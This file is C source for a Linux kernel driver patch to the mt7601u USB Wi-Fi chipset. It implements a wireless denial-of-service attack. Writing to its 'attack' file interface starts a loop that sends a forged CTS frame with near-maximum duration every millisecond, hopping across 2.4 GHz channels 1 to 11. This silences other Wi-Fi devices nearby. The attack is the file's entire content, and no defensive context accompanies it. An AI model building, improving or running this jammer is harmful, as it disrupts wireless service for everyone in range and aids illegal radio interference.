#include <linux/skbuff.h>
#include <linux/timer.h>
#include <linux/kernel.h>
#include <linux/ieee80211.h>
#include <net/cfg80211.h>
#include <linux/nl80211.h>
#include "mt7601u.h"

static const u8 CTS_Frame[] = {
    0x14, 0x00,     //header
    0xff, 0x7f,     //duration time 32ms
    0x7c, 0x3d, 0x09, 0x80, 0x83, 0x53, //receiver address(self)
};

static int current_channel_idx = 0;
static const int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};

static void mt7601u_cts_attack(struct mt7601u_dev *dev){
    struct sk_buff *skb;
    struct ieee80211_tx_info *info;
    struct ieee80211_tx_control control = {0};
    struct cfg80211_chan_def chandef;
    int channel = channels[current_channel_idx];

    skb = dev_alloc_skb(sizeof(CTS_Frame));
    if(!skb)    
        return;

    skb_put_data(skb, CTS_Frame, sizeof(CTS_Frame));
    info = IEEE80211_SKB_CB(skb);
    memset(info, 0, sizeof(*info));
    info->flags |= IEEE80211_TX_CTL_NO_ACK;
    skb_set_queue_mapping(skb, 0);
    mt7601u_tx(dev->hw, &control, skb);
    dev_info(dev->dev, "trans success on channel %d\n", channel);

    // Switch to next channel
    chandef.chan = ieee80211_get_channel(dev->hw->wiphy, 
                                         ieee80211_channel_to_frequency(channel, NL80211_BAND_2GHZ));
    if (chandef.chan) {
        chandef.width = NL80211_CHAN_WIDTH_20;
        chandef.center_freq1 = chandef.chan->center_freq;
        mt7601u_phy_set_channel(dev, &chandef);
        dev_info(dev->dev, "switched to channel %d\n", channel);
    }

    current_channel_idx = (current_channel_idx + 1) % ARRAY_SIZE(channels);
}

static void mt7601u_attack_work_handler(struct work_struct *work){
    struct mt7601u_dev *dev = container_of(work, struct mt7601u_dev, attack_work.work);
    if(!dev->attack_running)
        return;
    if (test_bit(MT7601U_STATE_REMOVED, &dev->state)) {
        dev->attack_running = false;
        return;
    }
    mt7601u_cts_attack(dev);
    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(1));//20ms default
}

static ssize_t mt7601u_attack_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    struct mt7601u_dev *dev = file->private_data;
    int val;

    if(kstrtoint_from_user(buf, count, 0, &val))    return -EINVAL;

    if(val == 1 && !dev->attack_running){
        dev->attack_running = true;
        INIT_DELAYED_WORK(&dev->attack_work, mt7601u_attack_work_handler);
        schedule_delayed_work(&dev->attack_work,0);
    }else if(val == 0) {
        dev->attack_running = false;
        cancel_delayed_work_sync(&dev->attack_work);
    }

    return count;
}

const struct file_operations fops_attack = {
    .write = mt7601u_attack_write,
    .open = simple_open
};